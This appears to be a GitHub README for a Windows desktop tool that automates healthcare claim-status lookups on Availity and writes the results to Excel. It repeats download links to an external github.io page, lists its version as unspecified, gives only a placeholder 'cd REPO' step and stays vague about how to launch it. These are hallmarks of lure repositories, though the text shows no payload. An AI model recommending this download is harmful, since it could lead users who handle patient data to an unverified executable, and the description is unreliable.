# Availity Automation - Healthcare Claim Status Automation 2026

> **Availity Automation is a Windows desktop claim-status tool that uses Playwright with Microsoft Edge to query payer portals, add results to Excel workbooks, and produce claim reports in builds with an unspecified version.**

[![Platform](https://img.shields.io/badge/Platform-Windows%20desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Unspecified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jamesalexpx1448/availity-windows-claim-automation?style=flat-square)](https://github.com/jamesalexpx1448/availity-windows-claim-automation)

---

<p align="center">
  <a href="https://jamesalexpx1448.github.io/availity-windows-claim-automation/">
    <img src="https://img.shields.io/badge/Download-Availity%20Automation%20Latest-brightgreen?style=for-the-badge" alt="Download Availity Automation">
  </a>
</p>

> **[Download Availity Automation](https://jamesalexpx1448.github.io/availity-windows-claim-automation/)**

---

[Download Latest Build](https://jamesalexpx1448.github.io/availity-windows-claim-automation/)

---

## Overview

Availity Automation provides a Windows desktop workflow for retrieving healthcare claim statuses from Availity and supported payer portals. The program reads XLSX and XLS files, carries out claim searches in Microsoft Edge, and exports the collected information into an enriched Excel workbook.

It is intended for teams reviewing claim activity across more than one payer. The desktop UI shows processing progress and errors, while resumable runs and targeted rechecks make it easier to manage extensive claim-review tasks.

---

## What It Does

- Loads claim workbooks saved as XLSX or XLS files.
- Looks up claim status details through Availity.
- Supports workflows involving multiple healthcare payer portals.
- Uses the Chrome DevTools Protocol (CDP) to connect with Microsoft Edge.
- Retrieves claim status, billed totals, paid totals, and denial explanations.
- Records payment information when it is available in the claim response.
- Runs rechecks on chosen claims without repeating the entire workbook.
- Continues processing from an interrupted session.
- Writes updated data on an ongoing basis to `Automated.xlsx`.
- Provides a Tkinter GUI with progress indicators and error messages.

---

## Getting Started

1. Obtain the current Windows build:

   [Download Availity Automation](https://jamesalexpx1448.github.io/availity-windows-claim-automation/)

2. To use the repository version, clone it and enter its directory:

   ```text
   git clone https://github.com/jamesalexpx1448/availity-windows-claim-automation.git
   cd REPO
   ```

3. Set up Microsoft Edge so the application can establish its CDP connection.
4. Launch the desktop program through the method included with the downloaded build or repository package.
5. From the application, open an XLSX or XLS workbook containing claims.

The startup file is not necessarily identical across distributions. Refer to the supplied project files or release instructions for the appropriate launch method.

---

## Running a Claim Check

The standard process follows these steps:

1. Launch Availity Automation on a Windows computer.
2. Choose a claim workbook in XLSX or XLS format.
3. Attach the application to the active Microsoft Edge session through CDP.
4. Select the claims or payer entries that should be handled.
5. Begin the claim-status lookup.
6. Watch the progress display and address any errors shown by the application.
7. Leave the run active so its results can be written to `Automated.xlsx`.
8. Perform selective rechecks on records that require a follow-up search.

Depending on the information returned by the payer portal, the output workbook may contain claim status, billed amounts, paid amounts, denial reasons, and payment details.

---

## Settings and Connections

Most setup is performed through the desktop interface. The relevant workflow inputs and connections are:

- The source XLSX or XLS workbook.
- The Microsoft Edge CDP connection.
- The claims or payer records selected for processing.
- The generated workbook, `Automated.xlsx`.

Before beginning, make sure Microsoft Edge is running in a way that permits the application's CDP connection and verify that the chosen workbook includes the claim data needed for the search.

---

## System Requirements

- Windows desktop environment.
- Microsoft Edge.
- Access to Availity and the relevant payer portals.
- An XLSX or XLS workbook containing claims.
- A Microsoft Edge session accessible through CDP.
- Enough storage for the application and the generated `Automated.xlsx` file.

---

## Frequently Asked Questions

### Which workbook formats are accepted?

Claim data can be imported from either `.xlsx` or `.xls` workbooks.

### What is the output filename?

The application continuously saves processed information to `Automated.xlsx`.

### Can I run another check on selected claims?

Yes. Selective rechecks let you process specific claims again without rerunning the complete workbook.

### Will an interrupted run have to start over?

No. Processing is resumable, so a run interrupted partway through can continue instead of requiring every claim to be searched again from the beginning.

### What browser automation setup does the application use?

Playwright automates Microsoft Edge, with the application connecting to the browser through CDP.

### Are multiple payer portals supported?

Yes. The Availity claim-status workflow accommodates multiple healthcare payer portals.

### What can I do if the browser connection fails?

Check that Microsoft Edge is running with a CDP-accessible configuration. Also verify the selected workbook and claim records, then consult the application's progress and error messages for more information.

### Where can I find new builds?

The latest build is available at the project download location:

[Download Latest Build](https://jamesalexpx1448.github.io/availity-windows-claim-automation/)

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
